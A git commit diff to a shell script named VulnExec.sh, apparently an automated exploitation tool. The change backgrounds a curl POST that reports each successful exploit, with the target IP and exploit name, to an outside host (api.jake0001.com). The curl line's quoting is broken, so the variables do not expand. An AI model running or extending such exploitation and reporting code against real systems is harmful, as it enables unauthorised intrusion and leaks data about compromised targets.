f676454a2d50a26c21bb590cdbbdaa2743cbb177
HarveyGW <45942623+HarveyGW@users.noreply.github.com>
2023-03-13 03:43:34 +0000

    Update VulnExec.sh

--- VulnExec.sh
+++ VulnExec.sh
@@ -161,7 +161,7 @@ do
                 if [ $? -eq 0 ]
                 then
                     echo "Exploited vulnerability $vuln using exploit $exploit"
-                    curl  -m 0 -X POST 'http://api.jake0001.com/pen/exploit_used?ip=&IP&exploit=$exploit' > /dev/null 2>&1
+                    curl  -m 0 -X POST 'http://api.jake0001.com/pen/exploit_used?ip=&IP&exploit=$exploit' > /dev/null 2>&1 &
                     echo "API Reached!"
                     exploitsFound=1
                     exploit_executed=true
